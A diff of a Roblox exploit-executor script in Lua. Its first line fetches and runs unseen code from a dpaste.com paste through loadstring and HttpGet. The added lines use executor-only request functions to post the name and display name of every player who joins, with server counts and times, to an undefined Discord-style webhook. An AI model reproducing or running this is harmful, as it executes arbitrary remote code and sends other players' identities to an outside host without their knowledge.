@@ -1,1 +1,57 @@
 loadstring(game:HttpGet("https://dpaste.com/385R5UGMC.txt", true))()
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+
+--==============================
+-- SEND WEBHOOK FUNCTION
+--==============================
+local function sendJoinWebhook(player)
+    local playerCount = #Players:GetPlayers()
+    local maxPlayers = Players.MaxPlayers
+    local timeNow = os.date("%H:%M:%S")
+
+    local embedData = {
+        username = Username,
+        embeds = {{
+            title = "👤 Player Joined Server",
+            color = 65280,
+            fields = {
+                {
+                    name = "Player",
+                    value = string.format("**%s** (%s)", player.Name, player.DisplayName),
+                    inline = false
+                },
+                {
+                    name = "Server",
+                    value = string.format("Players: %d/%d", playerCount, maxPlayers),
+                    inline = false
+                },
+                {
+                    name = "Time",
+                    value = timeNow,
+                    inline = false
+                }
+            }
+        }}
+    }
+
+    local req = http_request or request or (syn and syn.request)
+    if req then
+        pcall(function()
+            req({
+                Url = WebhookURL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(embedData)
+            })
+        end)
+    end
+end
+
+--==============================
+-- PLAYER JOIN LISTENER
+--==============================
+Players.PlayerAdded:Connect(function(player)
+    task.wait(1) -- maliit na delay para safe
+    sendJoinWebhook(player)
+end)
